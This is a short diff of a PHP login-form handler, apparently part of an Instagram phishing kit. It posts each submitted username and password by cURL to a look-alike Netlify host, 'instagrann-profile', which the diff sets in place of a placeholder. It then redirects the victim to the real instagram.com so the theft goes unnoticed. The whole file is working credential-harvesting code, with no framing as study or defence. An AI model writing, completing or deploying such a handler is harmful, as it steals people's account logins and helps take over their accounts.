@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Відправка даних на функцію Netlify
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://your-site-name.netlify.app/.netlify/functions/api.php");
+    curl_setopt($ch, CURLOPT_URL, "https://instagrann-profile.netlify.app/.netlify/functions/api.php");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('username' => $username, 'password' => $password)));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -16,4 +16,5 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header("Location: https://www.instagram.com");
     exit();
 }
+
 ?>
